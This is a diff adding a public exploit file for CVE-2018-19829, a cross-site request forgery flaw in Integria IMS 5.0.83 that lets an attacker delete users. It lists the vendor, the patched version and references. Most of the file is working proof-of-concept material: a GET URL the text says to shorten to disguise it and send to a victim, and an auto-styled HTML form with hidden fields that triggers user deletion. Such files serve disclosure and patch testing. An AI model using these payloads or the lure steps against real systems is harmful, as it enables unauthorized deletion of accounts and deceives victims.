@@ -1,0 +1,41 @@
+# Exploit Title: Integria IMS 5.0.83 - Cross-Site Request Forgery
+# Exploit Author: Javier Olmedo
+# Website: https://hackpuntes.com
+# Date: 2018-12-19
+# Google Dork: N/A
+# Vendor: Artica ST
+# Software Link: https://github.com/articaST/integriaims
+# Affected Version: 5.0.83 and possibly before
+# Patched Version: 5.0.84
+# Category: Web Application
+# Platform: Windows & Ubuntu
+# Tested on: Win10x64 & Kali Linux
+# CVE: 2018-19829
+# References:
+# https://hackpuntes.com/cve-2018-19829-integria-ims-5-0-83-cross-site-request-forgery/
+# https://github.com/articaST/integriaims/commit/a37c0c3d7cad74df64bfd3d98488aee4fa28b839
+
+# 1. Technical Description:
+# Integria IMS version 5.0.83 and possibly before are affected by Cross-Site Request Forgery
+# vulnerability, an attacker could delete users through GET or POST requests.
+ 
+# 2.1 Proof Of Concept (Delete User):
+
+(Method 1 - GET)
+Use Google URL Shortener (or similar) to shorten the next url
+http://[PATH]/ajax.php?page=include/ajax/delete_item_general&delete_item=1&name=delete_user&id=[ID])
+and send it to the victim.
+
+(Method 2 - POST)
+Use next form and send it tho the victim.
+<html>
+  <body>
+    <script>history.pushState('', '', '/')</script>
+    <form action="http://[PATH]/index.php">
+      <input type="hidden" name="sec" value="users" />
+      <input type="hidden" name="sec2" value="godmode&#47;usuarios&#47;lista&#95;usuarios" />
+      <input type="hidden" name="borrar&#95;usuario" value="[ID]" />
+      <input type="submit" value="Delete user" />
+    </form>
+  </body>
+</html>
